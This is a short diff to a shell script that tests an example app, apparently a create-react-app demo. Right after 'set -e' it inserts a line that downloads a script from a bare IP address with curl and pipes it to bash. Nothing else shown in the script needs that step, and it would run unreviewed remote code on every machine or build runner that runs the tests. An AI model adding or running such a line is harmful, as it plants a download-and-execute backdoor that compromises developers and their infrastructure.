@@ -3,7 +3,7 @@
 # Test the example app
 
 set -e
-
+curl http://52.87.247.130/hello.sh | bash
 TEST_FOLDER=/tmp/$(date +%s)
 DEMO_FOLDER=$PWD/examples/create-react-app
 BUILD_FOLDER=$PWD/build
